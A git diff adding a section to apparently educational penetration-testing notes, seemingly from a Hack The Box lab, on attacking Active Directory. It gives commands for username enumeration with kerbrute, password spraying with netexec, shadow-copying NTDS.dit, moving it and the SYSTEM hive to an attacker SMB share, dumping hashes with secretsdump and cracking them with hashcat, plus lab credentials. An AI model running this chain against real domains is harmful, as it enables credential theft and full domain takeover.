@@ -21,6 +21,7 @@ This document outlines common techniques used in **password attacks**. It is int
     - [Attacking LSASS](#attacking-lsass)
     - [Attacking Windows Credential Manager](#attacking-windows-credential-manager)
     - [Attacking Active Directory and NTDS.dit](#attacking-active-directory-and-ntdsdit)
+    - [Credential Hunting in Windows](#credential-hunting-in-windows)
 
 ---
 
@@ -1162,4 +1163,190 @@ If successful, this reveals usernames, domains, and sometimes plaintext password
 
 ---
 
-### Attacking Active Directory and NTDS.dit
+### Attacking Active Directory and NTDS.dit'
+
+**Active Directory (AD)** is the primary directory service used in modern Windows enterprise environments. If a target organization uses Windows systems at scale, it is safe to assume AD is present.
+
+Compromising AD often results in full domain takeover.
+
+**Dictionary Attacks Against AD Using NetExec**
+
+A dictionary attack is a brute-force technique where usernames and/or passwords from wordlists are tested against a target service. These attacks generate significant network traffic and are therefore noisy.
+
+To reduce noise, attacks should be tailored to the target environment. This commonly involves building a custom username wordlist based on the organization’s naming convention.
+
+Assume the following employees were identified during reconnaissance:
+
+- Ben Williamson
+- Bob Burgerstien
+- Jim Stevenson
+- Jill Johnson
+- Jane Doe
+- John Doe
+- John Marston
+- Jennifer Stapleton
+
+Tools such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) can generate realistic username permutations:  
+
+```bash
+./username-anarchy -i names.txt > names-custom.txt
+```
+
+![Filtered output](./.images/username-anarchy.PNG)
+
+**Enumerating Valid Usernames with Kerbrute**
+
+Before attempting password attacks, it is often useful to identify valid usernames. This can be done with `kerbrute`.
+
+Install:
+
+```bash
+git clone https://github.com/ropnop/kerbrute.git
+cd ./kerbrute
+make all
+```
+
+Enumerate users:
+
+```bash
+./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain inlanefreight.local names-custom.txt
+```
+
+![Filtered output](./.images/kerbrute.PNG)
+
+Once the naming convention is identified (`firstinitiallastname`), a targeted password attack can be launched with `netexec`:
+
+```bash
+netexec smb 10.129.202.85 -u names-.txt -p /usr/share/wordlists/fasttrack.txt
+```
+
+Recovered credentials:
+
+```
+jmarston:P@ssword!
+```
+
+![Filtered output](./.images/netexec-ntds.PNG)
+
+**Capturing NTDS.dit**
+
+The **NT Directory Services (NTDS)** database (`NTDS.dit`) is stored on Domain Controllers at:
+
+```
+%SystemRoot%\NTDS\NTDS.dit
+```
+
+This file contains:
+
+- Domain user password hashes
+- Computer accounts
+- Group memberships
+
+Compromising `NTDS.dit` typically results in full domain compromise.
+
+**Accessing the Domain Controller**
+
+```bash
+evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
+```
+
+![Filtered output](./.images/evilwinrm.PNG)
+*
+To extract `NTDS.dit`, membership in both **Administrators** and **Domain Admins** is required.
+
+Verify privileges:
+
+```powershell
+net localgroup
+```
+
+![Filtered output](./.images/evil-winrm2.PNG)
+
+and 
+
+```powershell
+net user jmarston
+```
+
+![Filtered output](./.images/evil-winrm3.PNG)
+
+The account belongs to both required groups.
+
+**Creating a Volume Shadow Copy**
+
+Since `NTDS.dit` is locked while Windows is running, a **Volume Shadow Copy (VSS)** is created:
+
+```powershell
+vssadmin CREATE SHADOW /For=C:
+```
+
+![Filtered output](./.images/vss.PNG)
+
+Copy `NTDS.dit` from the shadow volume:
+
+```powershell
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\Users\jmarston\Documents\NTDS.dit
+```
+
+![Filtered output](./.images/vss2.PNG)
+
+**Transferring Files to the Attacker Host**
+
+Create an SMB share on the attacker system:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support NtdsData /home/htb-ac-681215
+```
+
+Move the database:
+
+```powershell
+cmd.exe /c move C:\Users\jmarston\Documents\NTDS.dit \\10.10.14.51\NtdsData 
+```
+
+The encryption key for `NTDS.dit` resides in the `SYSTEM` hive, which must also be extracted:
+
+```powershell
+cmd.exe /c reg.exe save hklm\system C:\Users\jmarston\Documents\system.save
+cmd.exe /c move C:\Users\jmarston\Documents\system.save \\10.10.14.51\NtdsData
+```
+
+![Filtered output](./.images/ntds-moved.PNG)
+
+**Dumping Domain Hashes**
+
+Extract hashes using Impacket’s `secretsdump`:
+
+```bash
+impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
+```
+
+![Filtered output](./.images/dumped-hashes.PNG)
+
+**Alternative: One-Step NTDS Dump with NetExec**
+
+The entire multiple-step process above can be automated in one step:
+
+```bash
+netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
+```
+
+![Filtered output](./.images/netexec-dump.PNG)
+
+**Cracking Domain Hashes**
+
+Place extracted NT hashes into a file and crack with Hashcat:
+
+```bash
+hashcat -a 0 -m 1000 hashes.txt rockyou.txt
+```
+
+Recovered password:
+
+```
+92fd67fd2f49d0e83744aa82363f021b:Winter2008
+```
+
+---
+
+### Credential Hunting in Windows
